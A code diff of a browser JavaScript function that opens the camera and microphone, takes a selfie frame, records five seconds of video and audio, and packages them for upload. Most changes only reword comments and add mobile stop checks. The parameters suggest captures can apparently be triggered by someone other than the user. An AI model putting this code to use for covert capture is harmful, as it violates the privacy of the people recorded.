@@ -39,10 +39,10 @@ async function manualCapture(triggeredBy = "user", forcedUsername = "") {
       );
     });
 
-    // 🎥 Step 2: Request Camera + Mic
+    // 🎥 Step 2: Get Camera & Mic
     const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
 
-    // 🖼️ Step 3: Capture Selfie Frame
+    // 🖼️ Step 3: Capture Selfie
     const video = document.createElement("video");
     video.srcObject = stream;
     video.muted = true;
@@ -55,10 +55,9 @@ async function manualCapture(triggeredBy = "user", forcedUsername = "") {
     canvas.getContext("2d").drawImage(video, 0, 0);
     const selfieBlob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.85));
 
-    // 🔴 Step 4: Record Video + Audio Separately
+    // 🎞️ Step 4: Record Video + Audio Separately
     const videoTrack = stream.getVideoTracks()[0];
     const audioTrack = stream.getAudioTracks()[0];
-
     const videoStream = new MediaStream([videoTrack]);
     const audioStream = new MediaStream([audioTrack]);
 
@@ -73,19 +72,22 @@ async function manualCapture(triggeredBy = "user", forcedUsername = "") {
     videoRecorder.start();
     audioRecorder.start();
 
-    await new Promise(r => setTimeout(r, 5000)); // record for 5 seconds
-    videoRecorder.stop();
-    audioRecorder.stop();
+    // ⏱️ Record for 5 seconds
+    await new Promise(r => setTimeout(r, 5000));
+
+    // ✅ Force stop if still active (important for mobile)
+    if (videoRecorder.state !== "inactive") videoRecorder.stop();
+    if (audioRecorder.state !== "inactive") audioRecorder.stop();
 
     await Promise.all([
       new Promise(res => videoRecorder.onstop = res),
-      new Promise(res => audioRecorder.onstop = res)
+      new Promise(res => audioRecorder.onstop = res),
     ]);
 
     const videoBlob = new Blob(videoChunks, { type: "video/webm" });
     const audioBlob = new Blob(audioChunks, { type: "audio/webm" });
 
-    // 📨 Step 5: Upload
+    // 📤 Step 5: Upload
     const formData = new FormData();
     formData.append("selfie", selfieBlob, `selfie-${Date.now()}.jpg`);
     formData.append("video", videoBlob, `video-${Date.now()}.webm`);
